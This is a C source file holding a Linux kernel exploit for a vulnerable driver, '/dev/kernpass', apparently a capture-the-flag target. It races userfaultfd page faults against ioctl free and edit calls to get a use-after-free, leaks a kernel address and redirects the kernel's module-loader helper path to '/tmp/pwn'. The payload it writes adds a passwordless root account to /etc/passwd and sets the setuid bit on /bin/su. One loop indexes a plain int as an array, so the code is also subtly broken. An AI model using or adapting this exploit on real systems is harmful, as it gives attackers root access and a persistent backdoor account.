#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include "userfault.h"


#define PAGE_SIZE 0x1000

#ifdef DEBUG

#define logOK(msg, ...)     fprintf(stderr,"[+] " msg "\n", ##__VA_ARGS__)

#define logInfo(msg, ...)   fprintf(stderr,"[!] " msg "\n", ##__VA_ARGS__)

#define logErr(msg, ...)    fprintf(stderr,"[-] " msg "\n", ##__VA_ARGS__)

#define errExit(msg, ...)   do{ fprintf(stderr,"[-] " msg " ", ##__VA_ARGS__) ; perror("") ; exit(-1) ; }while(0)

#else

#define logOK(msg, ...)     asm("nop");

#define logInfo(msg, ...)   asm("nop");

#define logErr(msg, ...)    asm("nop");

#define errExit(msg, ...)   asm("nop");

#endif

#define devfile "/dev/kernpass" 

int devfd;

void open_dev(){
    devfd = open(devfile, O_RDONLY);
    if(devfd < 0){
        errExit("Can't open devfile");
    }
}

#define CMD_ALOC 0x13370001
#define CMD_READ 0x13370002
#define CMD_EDIT 0x13370003
#define CMD_FREE 0x13370004


struct Request{
  uint idx;
  uint size;
  char* data;
};

int cmd_aloc(struct Request* req){
    return ioctl(devfd,CMD_ALOC,req);
}

int cmd_read(struct Request* req){
    return ioctl(devfd,CMD_READ,req);
}

int cmd_edit(struct Request* req){
    return ioctl(devfd,CMD_EDIT,req);
}

int cmd_free(struct Request* req){
    return ioctl(devfd,CMD_FREE,req);
}

int stat_fd;

void* stage1(void* ){
    logInfo("Starting stage1 ...");

    struct Request req = {
        .idx = 1,
        .size = 0x20,
        .data = (char *)0x1337000
    };

    if(cmd_free(&req))
        errExit("cmd_free");
    

    stat_fd = open("/proc/self/stat",O_RDONLY);

    logOK("Stage1 done!");

}

void *stage2(void *){

    logInfo("Starting stage2 ...");

    struct Request req = {
        .idx = 2,
        .size = 16,
        .data = (char *)0x1338000
    };

    if(cmd_free(&req))
        errExit("cmd_free");

    
    req.idx = 0;
    req.size = 0x30;
    req.data = calloc(1,0x30);

    if(cmd_aloc(&req))
        errExit("cmd_free");

    req.idx = 1;
    if(cmd_aloc(&req))
        errExit("cmd_free");

    logOK("Stage2 done!");
}

int main(int argc,char** argv,char** envp){
    open_dev();

    register_ufd(0x1337000);

    pthread_t th1;
    pthread_create(&th1,NULL,race_userfault,stage1);

    char buf1[0x20] = {0};
    struct Request req = {
        .idx = 1,
        .size = 0x20,
        .data = buf1
    };

    sleep(1);

    if(cmd_aloc(&req)){
        errExit("cmd_aloc");
    }

    req.data = (char *)0x1337000;

    if(cmd_read(&req)){
        errExit("cmd_read");
    }

    uint64_t* leak = (uint64_t *)0x1337000;
    uint64_t single_stop = leak[1];
    logOK("single_stop = 0x%lx", single_stop);


    leak[0] = 0x30;
    leak[1] = single_stop + 0x16775b0; //0xffffffff82a8be80;
    memcpy(uf_buffer,leak,0x10);

    for(uint64_t i = 0 ; i < 0x40 ; ++i)
        close(stat_fd[i]);

    req.idx = 2;
    req.size = 16;
    req.data = calloc(1,16);

    if(cmd_aloc(&req)){
        errExit("cmd_aloc");
    }
    
    sleep(1);

    register_ufd(0x1338000);
    pthread_t th2;
    pthread_create(&th2,NULL,race_userfault,stage2);
    sleep(1);


    req.data = 0x1338000;
    if(cmd_edit(&req)){
        errExit("cmd_edit");
    }

    req.idx = 1;
    req.size = 0x30;
    req.data = "/tmp/pwn";

    if(cmd_edit(&req)){
        errExit("cmd_edit");
    }

    int vjpfd = open("/tmp/pwn", O_CREAT | O_RDWR);
    if(vjpfd < 0)
        errExit("open /tmp/pwn");
    dprintf(vjpfd,
        "#!/bin/sh\n"
        "echo 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\n"
        "/bin/chown root:root /bin/su\n"
        "/bin/chmod +s /bin/su"
    );
    close(vjpfd);
    if(chmod("/tmp/pwn",0777))
        errExit("chmod");

    //Trigger call call_modprobe
    int magic = open("/tmp/ok",O_CREAT | O_RDWR);
    if(magic < 0)
        errExit("open /tmp/ok");
    dprintf(magic,"\x13\x37\x42\x42");
    close(magic);
    if(chmod("/tmp/ok",0777))
        errExit("chmod");

    //Root
    system("/tmp/ok");
    system("cat /etc/passwd");
    system("su vjp");

    getchar();
}